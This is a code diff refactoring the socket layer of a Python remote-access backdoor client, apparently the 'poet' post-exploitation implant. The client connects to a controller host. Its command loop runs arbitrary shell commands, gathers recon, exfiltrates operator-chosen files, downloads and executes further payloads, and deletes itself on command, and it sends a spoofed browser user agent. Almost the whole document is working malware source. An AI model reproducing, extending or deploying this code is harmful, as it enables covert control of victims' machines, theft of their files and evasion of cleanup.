@@ -21,6 +21,69 @@ SIZE = 4096
 UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
 
 
+class PoetSocket(object):
+    """Socket wrapper for data transfer."""
+
+    def __init__(self, socket):
+        self.s = socket
+
+    def close(self):
+        self.s.close()
+
+    def exchange(self, msg):
+        self.send(msg)
+        return self.recv()
+
+    def send(self, msg):
+        """
+            Sends message using socket operating under the convention that the
+            message is prefixed by a big-endian 32 bit value indicating the
+            length of the following base64 string.
+        """
+
+        pkg = base64.b64encode(msg)
+        pkg_size = struct.pack('>i', len(pkg))
+        sent = self.s.sendall(pkg_size + pkg)
+        if sent:
+            raise socket.error('socket connection broken')
+
+    def recv(self):
+        """
+            Receives message from socket operating under the convention that
+            the message is prefixed by a big-endian 32 bit value indicating the
+            length of the following base64 string.
+
+            Returns the message.
+
+            TODO: Under high network loads, it's possible that the initial recv
+            may not even return the first 9 bytes so another loop is necessary
+            to ascertain that.
+        """
+
+        chunks = []
+        bytes_recvd = 0
+        initial = self.s.recv(SIZE)
+        if not initial:
+            raise socket.error('socket connection broken')
+        msglen, initial = (struct.unpack('>I', initial[:4])[0], initial[4:])
+        bytes_recvd = len(initial)
+        chunks.append(initial)
+        while bytes_recvd < msglen:
+            chunk = self.s.recv(min((msglen - bytes_recvd, SIZE)))
+            if not chunk:
+                raise socket.error('socket connection broken')
+            chunks.append(chunk)
+            bytes_recvd += len(chunk)
+        return base64.b64decode(''.join(chunks))
+
+
+class PoetSocketClient(PoetSocket):
+    def __init__(self, host, port):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((host, port))
+        super(PoetSocketClient, self).__init__(self.s)
+
+
 def get_args():
     """ Parse arguments and return dictionary. """
 
@@ -45,48 +108,47 @@ def is_active(host, port):
 
 
 def shell_client(host, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
+    s = PoetSocketClient(host, port)
     while True:
         try:
-            inp = sockrecv(s)
+            inp = s.recv()
             if inp == 'fin':
                 break
             elif inp == 'getprompt':
-                socksend(s, get_prompt())
+                s.send(get_prompt())
             elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-                socksend(s, shell_exec(inp))
+                s.send(shell_exec(inp))
             elif inp == 'recon':
-                socksend(s, shell_recon())
+                s.send(shell_recon())
             elif inp.startswith('shell '):
-                socksend(s, cmd_exec(inp[6:]).strip())
+                s.send(cmd_exec(inp[6:]).strip())
             elif inp.startswith('exfil '):
                 try:
                     with open(os.path.expanduser(inp[6:])) as f:
-                        socksend(s, f.read())
+                        s.send(f.read())
                 except IOError as e:
-                    socksend(s, e.strerror)
+                    s.send(e.strerror)
             elif inp == 'selfdestruct':
                 try:
                     os.remove(__file__)
                     if __file__.strip('./') not in os.listdir('.'):
-                        socksend(s, 'boom')
+                        s.send('boom')
                         sys.exit()
                     else:
                         raise Exception('client not deleted')
                 except Exception as e:
-                    socksend(s, str(e.message))
+                    s.send(str(e.message))
             elif inp.startswith('dlexec'):
                 try:
                     shell_dlexec(inp)
-                    socksend(s, 'done')
+                    s.send('done')
                 except Exception as e:
-                    socksend(s, str(e.message))
+                    s.send(str(e.message))
             else:
-                socksend(s, 'Unrecognized')
+                s.send('Unrecognized')
         except socket.error as e:
             if e.message == 'too much data!':
-                socksend(s, 'psh : ' + e.message)
+                s.send('psh : ' + e.message)
             else:
                 raise
     s.close()
@@ -127,47 +189,6 @@ def get_prompt():
     hn = cmd_exec('hostname').strip()
     end = '#' if user == 'root' else '$'
     return '{}@{} {} '.format(user, hn, end)
-
-
-def socksend(s, msg):
-    """
-        Sends message using socket operating under the convention that the
-        first nine bytes received are the size of the following message.
-    """
-
-    pkg = base64.b64encode(msg)
-    pkg_size = struct.pack('>i', len(pkg))
-    sent = s.sendall(pkg_size + pkg)
-    if sent:
-        raise socket.error('socket connection broken')
-
-
-def sockrecv(s):
-    """
-        Receives message from socket operating under the convention that the
-        first five bytes received are the size of the following message.
-        Returns the message.
-
-        TODO: Under high network loads, it's possible that the initial recv
-        may not even return the first 9 bytes so another loop is necessary
-        to ascertain that.
-    """
-
-    chunks = []
-    bytes_recvd = 0
-    initial = s.recv(SIZE)
-    if not initial:
-        raise socket.error('socket connection broken')
-    msglen, initial = (struct.unpack('>I', initial[:4])[0], initial[4:])
-    bytes_recvd = len(initial)
-    chunks.append(initial)
-    while bytes_recvd < msglen:
-        chunk = s.recv(min((msglen - bytes_recvd, SIZE)))
-        if not chunk:
-            raise socket.error('socket connection broken')
-        chunks.append(chunk)
-        bytes_recvd += len(chunk)
-    return base64.b64decode(''.join(chunks))
 
 
 def parse_exec_cmds(inp):
